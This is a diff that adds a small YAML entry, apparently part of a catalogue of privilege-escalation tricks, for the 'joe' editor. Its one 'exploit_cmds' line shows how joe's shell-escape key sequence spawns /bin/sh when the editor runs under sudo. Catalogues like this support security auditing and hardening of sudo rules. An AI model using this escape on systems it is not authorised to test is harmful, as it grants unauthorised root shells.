@@ -1,0 +1,4 @@
+name: joe
+binary_path: /usr/bin/joe
+exploit_cmds:
+- sudo /usr/bin/joe && ^K!/bin/sh
